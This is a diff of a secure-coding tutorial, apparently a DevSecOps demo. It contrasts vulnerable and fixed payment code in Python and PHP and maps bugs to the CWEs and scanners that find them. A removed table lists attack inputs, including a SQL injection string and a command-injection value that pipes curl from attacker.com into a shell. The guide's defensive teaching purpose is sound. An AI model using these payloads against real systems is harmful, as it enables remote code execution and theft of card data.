@@ -1154,35 +1154,6 @@ Note two things about the PHP column:
 Now open the secure versions (`secure_payment.py` / `secure_payment.php`) and walk the fixes:
 
 ```python
-# Python fixes:
-cursor.execute("SELECT ... WHERE user_id = ?", (user_id,))    # parameterised query
-subprocess.run(["script.sh", name], shell=False)               # list args, no shell
-hashlib.pbkdf2_hmac("sha256", card.encode(), salt, 600_000)   # PBKDF2 with salt
-json.loads(session_blob)                                        # no code execution surface
-```
-
-```php
-// PHP fixes:
-$stmt = $pdo->prepare('SELECT ... WHERE id = :id');            // PDO prepared statement
-$status = htmlspecialchars($_GET['status'], ENT_QUOTES, 'UTF-8'); // output encoding
-$safe = escapeshellarg($amount);                               // shell-safe wrapping
-$path = $allowed[$name];  include $path;                       // allowlist, not user path
-hash_hmac('sha256', $card_number, getenv('CARD_HASH_KEY'));    // HMAC-SHA256
-```
-
-> *"Same bug classes, two languages — intentional. These are not language-specific mistakes; they appear wherever developers stop treating input as hostile. For Python, CodeQL traces full data flow from function argument to cursor.execute() — fewer false positives than grep-based tools. For PHP, CodeQL has no native support, so Semgrep's p/php ruleset fills the gap — same findings, different engine, all in the same Security tab. The ZAP finding for CWE-79 XSS is the one no static scanner captures: it needs a running application returning a real HTTP response. SAST catches what's in the code; DAST catches what an attacker actually sees."*
-
-| Function | CWE | Attack scenario | Caught by |
-|---|---|---|---|
-| `PAYMENT_GATEWAY_KEY = "sk_live_..."` | CWE-798 | Key in git history + CI logs | Trivy secret scan |
-| `f"SELECT ... WHERE user_id = '{user_id}'"` | CWE-89 SQL injection | `' OR '1'='1'` dumps all card data | CodeQL, Snyk |
-| `os.system(f"generate_report.sh {report_name}")` | CWE-78 Command injection | `report; curl attacker.com \| sh` | CodeQL, Snyk |
-| `hashlib.md5(card_number.encode())` | CWE-327 Broken crypto | MD5 collisions — PCI-DSS Req 3.4 failure | Snyk DeepCode |
-| `pickle.loads(session_blob)` | CWE-502 Unsafe deserialisation | Craft payload → arbitrary code execution on load | Snyk, CodeQL |
-
-Now open `demo/insecure-code/secure_payment.py` and walk through the remediations:
-
-```python
 # CWE-89 fix: parameterised query — user input is never in the SQL string
 cursor.execute("SELECT card_number, amount FROM payments WHERE user_id = ?", (user_id,))
 
@@ -1199,6 +1170,17 @@ session = json.loads(session_blob)
 required_keys = {"user_id", "expires_at", "cart_total_pence"}
 if not required_keys.issubset(session): raise ValueError(...)
 ```
+
+```php
+// PHP fixes:
+$stmt = $pdo->prepare('SELECT ... WHERE id = :id');            // PDO prepared statement
+$status = htmlspecialchars($_GET['status'], ENT_QUOTES, 'UTF-8'); // output encoding
+$safe = escapeshellarg($amount);                               // shell-safe wrapping
+$path = $allowed[$name];  include $path;                       // allowlist, not user path
+hash_hmac('sha256', $card_number, getenv('CARD_HASH_KEY'));    // HMAC-SHA256
+```
+
+> *"Same bug classes, two languages — intentional. These are not language-specific mistakes; they appear wherever developers stop treating input as hostile. For Python, CodeQL traces full data flow from function argument to cursor.execute() — fewer false positives than grep-based tools. For PHP, CodeQL has no native support, so Semgrep's p/php ruleset fills the gap — same findings, different engine, all in the same Security tab. The ZAP finding for CWE-79 XSS is the one no static scanner captures: it needs a running application returning a real HTTP response. SAST catches what's in the code; DAST catches what an attacker actually sees."*
 
 > *"SAST catches these before the first line runs in any environment. The developer sees
 > the annotation on their PR diff — SQL injection on line 23 — with the fix suggestion
